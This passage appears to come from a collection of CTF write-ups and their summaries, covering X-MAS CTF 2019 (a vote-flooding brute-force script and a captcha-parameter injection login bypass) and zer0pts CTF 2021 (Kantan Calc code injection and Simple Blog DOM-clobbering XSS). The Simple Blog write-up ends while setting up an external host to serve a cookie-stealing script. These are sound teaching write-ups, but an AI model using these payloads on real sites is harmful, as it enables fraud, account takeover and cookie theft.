					</div><div class=""ideaText"">Idea text.</div></div>
		<footer>
			As seen on Good Morning America
		</footer>

		<script src=""/md5.js""></script>
		<script src=""/index.js""></script>
	</div>
</body>
```

The JavaScript into `index.js` is the following.

```javascript
function generateRandom (length) {
	var result = '';
	var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;

	for (var i = 0; i < length; i++)
		result += characters.charAt (Math.floor (Math.random () * charactersLength));

	return result;
}

function vote (id, upvote) {
	var xhttp = new XMLHttpRequest ();
	xhttp.open (""GET"", ""/vote.php?g=1"", false);
	xhttp.send ();
	var work = xhttp.responseText;

	var statusElement = document.getElementById (""status"");
	statusElement.className = ""status"";
	statusElement.innerText = ""CPU Voting on Idea #"" + id + "" ..."";

	var found = false;
	while (!found) {
		var randomLength = Math.floor (7 + Math.random () * 18);
		var stringGen = generateRandom (randomLength);
		var md5Gen = md5 (""watch__bisqwit__"" + stringGen);

		if (md5Gen.substring (0, work.length).localeCompare (work) === 0) {
			var url = ""/vote.php?id="" + id + ""&h="" + stringGen;
			if (upvote === 1)
				url += ""&u=1"";

			xhttp.open (""GET"", url, false);
			xhttp.send ();
			found = true;
		}
	}

	location.href = ""/"";
}
```

The voting procedure requires that a sort of challenge is returned by the server after the first request, i.e. `xhttp.open (""GET"", ""/vote.php?g=1"", false);`, and then the client has to find a string which produces a MD5 hash with the first characters equals to the challenge. The challenge is different each time.

To reduce the time of finding correct strings, a smart voter can be implemented, using a cache and storing all failed attempts. With this trick, after ~14M  requests all strings will be found inside the cache, reducing the time of generation.

The exploit is the following.

```javascript
function wait(ms) {
    var d = new Date();
    var d2 = null;
    do {
        d2 = new Date(); 
    } while(d2-d < ms);
}

function voteSmart(id) {
    
    const cacheLimit = 90000000;
    var cacheElements = 0;
    var cache = new Map();
    
    console.log(""Start voting."");
    var votes = 0
    while(votes <= 250) {
    
        console.log(""Cookies: "" + document.cookie);
    
        var xhttp = new XMLHttpRequest ();
        xhttp.open (""GET"", ""/vote.php?g=1"", false);
        xhttp.send ();
        work = xhttp.responseText;
        console.log(""Work to find is: "" + work);
        
        stringGen = """";
        if(work in cache) {
            console.log(""Cache hit!"");
            stringGen = cache[work];
            wait(1000);
        } else {
         
            var found = false;
            while(!found) {
                var randomLength = Math.floor(7 + Math.random () * 18);
                stringGen = generateRandom(randomLength);
                var md5Gen = md5(""watch__bisqwit__"" + stringGen);
                var md5Subs = md5Gen.substring(0, work.length);
                
                if(cacheElements < cacheLimit && !(md5Subs in cache)) { // Updating cache at runtime.
                    cache[md5Subs] = stringGen;
                    cacheElements++;
                    if(cacheElements % 1000000 == 0) {
                        console.log(""There are "" + cacheElements + "" cache elements."")
                    }
                }

                if(md5Subs.localeCompare(work) === 0) {
                    found = true;
                }
            }
        }
        
        var url = ""/vote.php?id="" + id + ""&h="" + stringGen + ""&u=1"";
        xhttp.open (""GET"", url, false);
        xhttp.send ();
        voteResult = xhttp.responseText;
        votes++;
        console.log(votes + "" > "" + voteResult);
        
        if(voteResult.includes(""X-MAS{"")) {
            alert(voteResult);
            break;
        }
         
    }
}

voteSmart(23148);
```

You can launch the exploit script into the browser console and then refresh the page to get the flag.

```
X-MAS{NASA_aint_got_n0thin_on_m3}
```","With the website you can submit an idea. An ID is assigned to that idea and the idea can be voted.

The JavaScript into `index.js` contains the voting procedure, it requires that a sort of challenge is returned by the server after the first request, and then the client has to find a string which produces a MD5 hash with the first characters equals to the challenge. The challenge is different each time.

To reduce the time of finding correct strings, a smart voter can be implemented, using a cache and storing all failed attempts. With this trick, after ~14M  requests all strings will be found inside the cache, reducing the time of generation.

You can launch the exploit script into the browser console and then refresh the page to get the flag."
"# X-MAS CTF 2019 – Roboworld

* **Category:** web
* **Points:** 50

## Challenge

> A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(
> 
> Can you figure out what's wrong and access the secret files?
> 
> Remote server: http://challs.xmas.htsp.ro:11000
>
> Files: [leak.py](leak.py)
>
> Author: Reda

## Solution

The webpage contains the following HTML code.

```html
<head>
    <script>
        function captchaGenerateVerificationValue()
        {
            //Devnote:
            //Oops I broke the captcha verification function
            //so it will just generate random stuff for the verification value
            //hope no one notices :O

            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            result = """"
            for ( var i = 0; i < 10; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }

            document.getElementById(""captcha"").value = result
        }
    </script>
</head>

Login:

<form method=""post"" action=""/login"">
    Username: <input type=""text"" name=""user"" /><br>
    Password: <input type=""password"" name=""pass"" /><br>
    Captcha: <input id=""captcha"" onchange=""captchaGenerateVerificationValue()"" type=""checkbox"" name=""captcha_verification_value"" value="""" /> I am not a robot <br>
    <input type=""submit"" value=""Login"" /><br>
</form>
```

So the CAPTCHA checkbox produces random string.

Analyzing the [leak.py](leak.py) file you can discover that the following credentials are used to login:
* username: `backd00r`;
* password: `catsrcool`.

```python
from flask import Flask, render_template, request, session, redirect
import os
import requests
from captcha import verifyCaptchaValue

app = Flask(__name__)

@app.route('/')
def index():
    return render_template(""index.html"")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    captchaToken = request.form.get('captcha_verification_value')

    privKey = ""XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"" #redacted
    r = requests.get('http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&privateKey={}'.format(str(port), captchaToken, privKey))
    #backdoored ;)))
    if username == ""backd00r"" and password == ""catsrcool"" and r.content == b'allow':
        session['logged'] = True
        return redirect('//redacted//')
    else:
        return ""login failed""


@app.route('/captchaVerify')
def captchaVerify():
    #only 127.0.0.1 has access
    if request.remote_addr != ""127.0.0.1"":
        return ""Access denied""

    token = request.args.get('captchaUserValue')
    privKey = request.args.get('privateKey')
    #TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system
    if(verifyCaptchaValue(token, privKey)):
        return str(""allow"")
    else:
        return str(""deny"")
```

Then you have to beat an HTTP GET service available only on localhost. It consumes the CAPTCHA token and a private key that is redacted in the source code.

A TODO comment claims that there is a debugging private key for used for testing: `8EE86735658A9CE426EAF4E26BB0450E`. This seems to be the MD5 of the string: `fuckingdog`.

You can manipulate the link used in the `requests.get` operation, via CAPTCHA parameter, excluding the existing private key parameter through `#` and forcing the debugging private key.

The payload is the following.

```
pwned&privateKey=8EE86735658A9CE426EAF4E26BB0450E#
```

So the following HTTP request can be used.

```
POST /login HTTP/1.1
Host: challs.xmas.htsp.ro:11000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://challs.xmas.htsp.ro:11000
Connection: close
Referer: http://challs.xmas.htsp.ro:11000/
Upgrade-Insecure-Requests: 1

user=backd00r&pass=catsrcool&captcha_verification_value=pwned%26privateKey%3D8EE86735658A9CE426EAF4E26BB0450E%23

HTTP/1.1 302 FOUND
Server: nginx
Date: Mon, 16 Dec 2019 21:48:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 251
Location: http://challs.xmas.htsp.ro:11000/dashboard_jidcc88574c
Connection: close
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWQiOnRydWV9.Xff7wQ.nX353pLhy-6ES9lB32QOopGmz-Y; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href=""/dashboard_jidcc88574c"">/dashboard_jidcc88574c</a>.  If not click the link.
```

The page where you will be redirect is the following

```html
<h2>Welcome to the secret website where we store secret stuff</h2>
<br>
<br>
Secret Stuff:
<br>
<a href=""/static/hidden_directory_1337_781/098c533dc5420628a9f51c1911198c4c.jpg"">098c533dc5420628a9f51c1911198c4c.jpg</a>
<br>
<a href=""/static/hidden_directory_1337_781/2.jpg"">2.jpg</a>
<br>
<a href=""/wtf.mp4"">wtf.mp4</a>
```
It will contain three files:
* [098c533dc5420628a9f51c1911198c4c.jpg](098c533dc5420628a9f51c1911198c4c.jpg);
* [2.jpg](2.jpg);
* [wtf.mp4](wtf.mp4).

Inside the [wtf.mp4](wtf.mp4) video there is the flag, reversed in order.

```
X-MAS{Am_1_Th3_R0bot?_0.o}
```","The webpage contains a CAPTCHA checkbox that produces random string.

Analyzing the leak.py file you can discover the credentials used to login.

Then you have to beat an HTTP GET service available only on localhost. It consumes the CAPTCHA token and a private key that is redacted in the source code.

A TODO comment claims that there is a debugging private key for used for testing. This seems to be the MD5 of the string.

You can manipulate the link used in the `requests.get` operation, via CAPTCHA parameter, excluding the existing private key parameter through `#` and forcing the debugging private key.

So the HTTP POST can be performed crafting the payload.

The page where you will be redirect contains an mp4 file.

Inside the mp4 video there is the flag, reversed in order."
"# zer0pts CTF 2021 – Kantan Calc

* **Category:** web
* **Points:** 135

## Challenge

> ""Kantan"" means simple or easy in Japanese.
> 
> http://web.ctf.zer0pts.com:8002/
> 
> author:st98

## Solution

The challenge gives you an [attachment](kantan_calc_a4f3130c72d9093ab206a29e27e40123.tar.gz) containing the source code: [app.js](kantan_calc/app.js).

```javascript
const express = require('express');
const path = require('path');
const vm = require('vm');
const FLAG = require('./flag');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';

  if (code && code.length < 30) {
    try {
      const result = vm.runInNewContext(`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`, Object.create(null), { timeout: 100 });
      output = result + '';
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
    } catch (e) {
      output = 'Error: error occurred';
    }
  } else {
    output = 'Error: invalid code';
  }

  res.render('index', { title: 'Kantan Calc', output });
});

app.get('/source', function (req, res) {
  res.sendFile(path.join(__dirname, 'app.js'));
});

module.exports = app;
```

The website is a some sort of calculator.

Even if several articles on how to escape `vm` sandbox can be found on the Internet, here the point is to dump the source code of the defined function.

Two constraints are present:
1. the payload must be lesser than 30 chars;
2. if the output contains `zer0pts`, so the starting part of the flag, it will be blocked.

This is a *code injection* challenge.

First of all, a JavaScript named function can print itself, with comments, if its name is returned.

```javascript
(function p() { return p; /* Comment. */ })()
```

The structure of the given script can be seen as something like `(x, y)()`.

If you try to exfiltrate the function source code in this way, you will be blocked by the check on the output content, because the output is converted to a string and checked for the presence of `zer0pts`.

In JavaScript you can convert a string to an array of chars with the following clause: `[...p]`. With this trick you could bypass the check on the content.

But you can't execute that clause directly on `p` because it `is not iterable`. So you have to convert it to a string with a concatenation.

Putting all together, you can have the following payload.

```javascript
},function p(){return[...p+1]
```

The flag is the following.

```
zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}
```","The challenge gives you a tar.gz containing the source code.

The website is a some sort of calculator.

Even if several articles on how to escape `vm` sandbox can be found on the Internet, here the point is to dump the source code of the defined function.

Two constraints are present: the payload must be lesser than 30 chars and if the output contains `zer0pts`, so the starting part of the flag, it will be blocked.

This is a code injection challenge.

First of all, a JavaScript named function can print itself, with comments, if its name is returned.

The structure of the given script can be seen as something like `(x, y)()`.

If you try to exfiltrate the function source code in this way, you will be blocked by the check on the output content, because the output is converted to a string and checked for the presence of `zer0pts`.

In JavaScript you can convert a string to an array of chars with the following clause: `[...p]`. With this trick you could bypass the check on the content.

But you can't execute that clause directly on `p` because it `is not iterable`. So you have to convert it to a string with a concatenation.

Putting all together, you can craft the payload and get the flag."
"# zer0pts CTF 2021 – Simple Blog

* **Category:** web
* **Points:** 192

## Challenge

> Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?
> 
> http://web.ctf.zer0pts.com:8003/
> 
> author:st98

## Solution

The challenge gives you an [attachment](simple_blog_1bfee2f68d1fbeec74729e11cae31aab.tar.gz) containing the source code. The most important files are [`index.php`](simple_blog/web/www/index.php) and [`api.php`](simple_blog/web/www/api.php).

Analyzing the website, you can discover the following message under the ""Report Vulnerability"" section.

> If you find a vulnerability in my blog platform, please report a Proof of Concept that exfiltrates document.cookie to me. I will check the URL with Mozilla Firefox later.
> 
> I only accept reports under /index.php, so please submit only GET paremeters. For example, if the URL you want to submit is http://example.com/index.php?theme=light, please submit only theme=light part.

So, given this message and the challenge description, it's pretty obvious that the target of the challenge is to exploit some sort of *Reflected XSS*.

The website allows the possibility to change the theme via a URL parameter.

Passing a value for the `theme` parameter will reflect the passed value in some parts of the webpage.

```
GET /?theme=foo HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:17:41 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 2957
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-foo.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-foo bg-foo"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""DZ5mzla/D4n5wZNlTB5qQwurzU4="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""DZ5mzla/D4n5wZNlTB5qQwurzU4="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

You can pass a `callback` parameter to the [`api.php`](simple_blog/web/www/api.php) endpoint and the method will be reflected into the output. The length limit is 20 chars.

```
GET /api.php?callback=foo HTTP/1.1
Host: web.ctf.zer0pts.com:8003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: */*
Referer: http://web.ctf.zer0pts.com:8003/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:08:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 569
Connection: close
Content-Type: application/javascript

foo([{""id"":1,""title"":""Hello, world!"",""content"":""Welcome to my blog platform!""},{""id"":2,""title"":""Lorem ipsum"",""content"":""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.""}])
```

Theoretically, the following payload would give an XSS, but it is blocked by the CSP.

```
GET /?theme=dark.min.css""><script>alert()</script>< HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:19:19 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 3065
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-dark.min.css""><script>alert()</script><.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-dark.min.css""><script>alert()</script>< bg-dark.min.css""><script>alert()</script><"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""gGLouNdYKt4a0tKHwIOwMDc9Giw="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""gGLouNdYKt4a0tKHwIOwMDc9Giw="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

The CSP is the following (defined in the `meta` tag of [`index.php`](simple_blog/web/www/index.php)) and it can't be bypassed easily.

```
default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default
```

First of all: you have to use Firefox for your testing phase, because the admin will use that browser.

The most important part of [`index.php`](simple_blog/web/www/index.php) is the following JavaScript.

```javascript
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
```

The process works as follow:
1. a [`trusted-types`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types) policy is created;
2. the `jsonp` method is invoked;
3. the `jsonp` method calls [`api.php`](simple_blog/web/www/api.php) passing the content of `window.callback`, if specified;
4. [`api.php`](simple_blog/web/www/api.php) returns a JavaScript snippet that will be included in the webpage and it will be executed, because it is considered ""safe"" for all defined policies;
5. the default method that will be executed is the `render` one, that will print blog posts into the page.

As a consequence, if it is possible to define `window.callback` you can execute an arbitrary JavaScript payload.

This can be achieved with a technique called [*DOM clobbering*](https://portswigger.net/web-security/dom-based/dom-clobbering). With this technique, the `window.callback` can be the reference to an HTML object with `id=""callback""`, so a payload like the following can be used.

```
GET /?theme=dark.min.css%22%3E%3Cdiv+id=%22callback%22%3Efoo%3C/div%3E%3C HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:33:35 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 3077
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-uA0mbXM3XN0qqrr9Ln1E26ka/tE=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-dark.min.css""><div id=""callback"">foo</div><.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-dark.min.css""><div id=""callback"">foo</div>< bg-dark.min.css""><div id=""callback"">foo</div><"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""uA0mbXM3XN0qqrr9Ln1E26ka/tE="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""uA0mbXM3XN0qqrr9Ln1E26ka/tE="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

But this will trigger the error: `custom callback is unimplemented`. That happens because, in the CSP, there is the definition of `default` trusted type which is defined in the `init()` JavaScript function in the page.

![custom_callback_error.png](custom_callback_error.png)

The *DOM clobbering* technique can help you again. Here some references that can be useful to understand how it works:
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* [https://portswigger.net/research/dom-clobbering-strikes-back](https://portswigger.net/research/dom-clobbering-strikes-back)
* [https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
* [https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41](https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41)

The first step is to inject via *DOM clobbering* a `trustedType` object in order to override the one provided by the library. An exception will be thrown and the `catch` in the `init()` method will be reached. To bypass the `if` clause inside the `catch`, it is sufficient to use again the *DOM clobbering*, using a payload like the following.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><""
```

Now you can call the the api.php endpoint specifying a callback. A payload like the following can give a basic XSS.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=callback href=//%250Aalert();></a><""
```

Beacause the result request will be the following.

```
GET /api.php?callback=//%0Aalert(); HTTP/1.1
Host: web.ctf.zer0pts.com:8003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://web.ctf.zer0pts.com:8003/?theme=dark.min.css%22%3E%3Cform%20id=trustedTypes%3E%3Coutput%20id=defaultPolicy%3Etrue%3C/output%3E%3C/form%3E%3Ca%20id=callback%20href=//%250Aalert();%3E%3C/a%3E%3C%22

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 14:03:22 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 577
Connection: close
Content-Type: application/javascript

//
alert();([{""id"":1,""title"":""Hello, world!"",""content"":""Welcome to my blog platform!""},{""id"":2,""title"":""Lorem ipsum"",""content"":""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.""}])
```

You can use `jsonp` method itself to perform cross-origin request, getting the URL via *DOM clobbering* to bypass the maximum length.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=x href=https://<REDACTED>.free.beeceptor.com/></a><a id=callback href=//%250Ajsonp(x);></a><""
```

Analyzing the final webpage after the request, you can discover that with `jsonp` method the response of the cross-origin call is included in the page source and treated like an allowed JavaScript.

![remote_script.png](remote_script.png)

So you can create two endpoints:
* `/evil/` that will be called by the `jsonp` method and will return a cookie grabber script;
